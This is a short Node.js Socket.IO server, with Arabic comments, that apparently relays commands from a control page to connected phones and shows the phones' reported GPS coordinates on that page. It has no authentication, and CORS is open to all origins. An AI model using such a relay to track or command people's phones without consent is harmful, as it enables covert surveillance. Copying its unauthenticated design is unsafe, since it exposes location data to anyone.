const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*", // مهم جداً للسماح للموبايل بالاتصال
        methods: ["GET", "POST"]
    }
});

// توجيه المتصفح لفتح صفحة التحكم
app.get('/', (req, res) => {
    // هذه الصفحة هي التي سيراقبها UptimeRobot
    res.sendFile(path.join(__dirname, 'index.html'));
});

// التعامل مع الاتصالات
io.on('connection', (socket) => {
    console.log('جهاز متصل الآن: ' + socket.id);

    // استقبال الأوامر من لوحة التحكم وإرسالها للموبايل
    socket.on('admin_command', (data) => {
        console.log('إرسال أمر للموبايل:', data.command);
        // نستخدم broadcast لإرسال الأمر لكل الأجهزة المتصلة ماعدا المرسل (لوحة التحكم)
        socket.broadcast.emit(data.command, { timestamp: Date.now() });
    });

    // استقبال الإحداثيات من الموبايل (Python/Kivy)
    socket.on('location_update', (data) => {
        console.log('وصلت إحداثيات جديدة:', data);
        // إرسالها للوحة التحكم لعرضها
        io.emit('display_location', data);
    });

    socket.on('disconnect', () => {
        console.log('جهاز قطع الاتصال');
    });
});

// تشغيل السيرفر على البورت الذي يحدده Replit أو 3000
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running permanently on port ${PORT}`);
});
